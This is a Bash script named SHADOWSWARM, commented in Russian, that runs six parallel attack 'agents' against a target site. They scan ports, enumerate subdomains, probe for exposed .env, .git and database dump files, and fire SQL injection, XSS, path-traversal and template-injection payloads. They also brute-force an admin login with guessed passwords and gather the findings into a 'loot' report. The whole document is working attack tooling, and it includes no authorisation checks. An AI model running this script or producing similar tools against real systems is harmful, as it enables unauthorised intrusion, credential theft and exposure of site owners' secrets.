#!/bin/bash
# SHADOWSWARM — Рой агентов для распределённого пентеста

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
SWARM_DIR="$HOME/.shadow_swarm"
mkdir -p "$SWARM_DIR/agents" "$SWARM_DIR/loot" "$SWARM_DIR/logs"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — SHADOWSWARM                ║"
echo "║   Рой из 6 агентов для распределённой атаки ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# ===== АГЕНТ 1: Разведчик (Recon) =====
echo "[SWARM] Запускаю Разведчика..."
(
    echo "[RECON] Сканирую порты..."
    nmap -T4 --top-ports 20 "$DOMAIN" > "$SWARM_DIR/loot/ports.txt" 2>/dev/null
    
    echo "[RECON] Ищу поддомены..."
    curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
        grep -oP '"name_value":"\K[^"]+' | sort -u > "$SWARM_DIR/loot/subdomains.txt"
    
    echo "[RECON] Готово"
) > "$SWARM_DIR/logs/recon.log" 2>&1 &
PID1=$!

# ===== АГЕНТ 2: Охотник за файлами (File Hunter) =====
echo "[SWARM] Запускаю Охотника..."
(
    echo "[HUNTER] Ищу секретные файлы..."
    for f in /.git/HEAD /.env /.env.backup /wp-config.php /dump.sql /backup.zip /phpinfo.php; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$f" 2>/dev/null)
        [ "$code" = "200" ] && echo "💰 $f [HTTP $code]" >> "$SWARM_DIR/loot/files.txt"
    done
    echo "[HUNTER] Готово"
) > "$SWARM_DIR/logs/hunter.log" 2>&1 &
PID2=$!

# ===== АГЕНТ 3: Инъектор (Injection Master) =====
echo "[SWARM] Запускаю Инъектора..."
(
    echo "[INJECT] Тестирую инъекции..."
    for p in "' OR '1'='1" "<script>alert(1)</script>" "../../etc/passwd" "{{7*7}}"; do
        resp=$(curl -sk --max-time 5 "$TARGET?q=$p" -o /tmp/swarm_inj.html -w "%{http_code}" 2>/dev/null)
        if grep -qi "error\|syntax\|root:\|49" /tmp/swarm_inj.html 2>/dev/null; then
            echo "💉 $p [HTTP $resp]" >> "$SWARM_DIR/loot/injections.txt"
        fi
    done
    echo "[INJECT] Готово"
) > "$SWARM_DIR/logs/inject.log" 2>&1 &
PID3=$!

# ===== АГЕНТ 4: Брутфорсер (Brute Force) =====
echo "[SWARM] Запускаю Брутфорсера..."
(
    echo "[BRUTE] Пробую пароли..."
    COMPANY=$(echo "$DOMAIN" | cut -d. -f1)
    for pass in "${COMPANY}123" "admin123" "password" "admin" "${COMPANY}2024"; do
        code=$(curl -sk -d "username=admin&password=$pass" -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/login" 2>/dev/null)
        [ "$code" = "302" ] && echo "🔑 admin:$pass [HTTP $code]" >> "$SWARM_DIR/loot/credentials.txt"
    done
    echo "[BRUTE] Готово"
) > "$SWARM_DIR/logs/brute.log" 2>&1 &
PID4=$!

# ===== АГЕНТ 5: Сборщик технологий (Tech Detective) =====
echo "[SWARM] Запускаю Детектива..."
(
    echo "[TECH] Определяю технологии..."
    HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
    echo "$HEADERS" | grep -qi "cf-ray" && echo "🛡️ Cloudflare" >> "$SWARM_DIR/loot/tech.txt"
    echo "$HEADERS" | grep -qi "Server:" && echo "📡 $(echo "$HEADERS" | grep -i 'Server:' | head -1)" >> "$SWARM_DIR/loot/tech.txt"
    echo "$HEADERS" | grep -qi "X-Powered-By:" && echo "⚡ $(echo "$HEADERS" | grep -i 'X-Powered-By:' | head -1)" >> "$SWARM_DIR/loot/tech.txt"
    echo "[TECH] Готово"
) > "$SWARM_DIR/logs/tech.log" 2>&1 &
PID5=$!

# ===== АГЕНТ 6: Координатор (Coordinator) =====
echo "[SWARM] Запускаю Координатора..."
(
    wait $PID1 $PID2 $PID3 $PID4 $PID5
    
    # Собираем все находки
    echo "══════════════════════════════════════════════" > "$SWARM_DIR/report.txt"
    echo "  SHADOWSWARM — ОТЧЁТ РОЯ" >> "$SWARM_DIR/report.txt"
    echo "  Цель: $TARGET" >> "$SWARM_DIR/report.txt"
    echo "  Время: $(date)" >> "$SWARM_DIR/report.txt"
    echo "══════════════════════════════════════════════" >> "$SWARM_DIR/report.txt"
    
    for loot in "$SWARM_DIR/loot/"*; do
        [ -f "$loot" ] && [ -s "$loot" ] && {
            echo "" >> "$SWARM_DIR/report.txt"
            echo "--- $(basename $loot .txt) ---" >> "$SWARM_DIR/report.txt"
            cat "$loot" >> "$SWARM_DIR/report.txt"
        }
    done
    
    echo "" >> "$SWARM_DIR/report.txt"
    echo "Всего находок: $(cat "$SWARM_DIR/loot/"* 2>/dev/null | wc -l)" >> "$SWARM_DIR/report.txt"
    
    echo "[COORDINATOR] Рой завершил работу"
    echo "[COORDINATOR] Отчёт: $SWARM_DIR/report.txt"
    echo "[COORDINATOR] Лут: $SWARM_DIR/loot/"
) > "$SWARM_DIR/logs/coordinator.log" 2>&1 &
PID6=$!

echo ""
echo "[SWARM] Все 6 агентов запущены!"
echo "  🕵️ Разведчик (PID $PID1)"
echo "  🔍 Охотник (PID $PID2)"
echo "  💉 Инъектор (PID $PID3)"
echo "  🔑 Брутфорсер (PID $PID4)"
echo "  🧬 Детектив (PID $PID5)"
echo "  🎯 Координатор (PID $PID6)"
echo ""
echo "  Жди — Координатор соберёт отчёт когда все закончат"
echo "  Отчёт: $SWARM_DIR/report.txt"
